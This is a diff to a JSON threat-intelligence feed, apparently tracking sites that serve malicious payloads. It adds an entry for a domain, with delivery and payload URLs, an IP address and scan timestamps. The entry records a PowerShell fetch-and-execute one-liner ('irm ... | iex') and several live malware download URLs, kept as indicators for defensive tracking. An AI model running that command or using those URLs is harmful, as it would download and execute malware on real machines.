@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "chatatrebichava.sk",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b0de676f73f38451"
+    ],
+    "IP": [
+      "37.9.175.195"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b0de676f73f38451')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b0de676f73f38451"
+    ],
+    "ReportId": "cmwmotlf31trr0omlxtldvn56",
+    "ScannedAt": "2026-11-18T22:23:12.108000+00:00"
+  },
+  {
     "UrlDomain": "gruendlers.com.tr",
     "DeliveryUrl": [
       "j7tracker.gb.net"
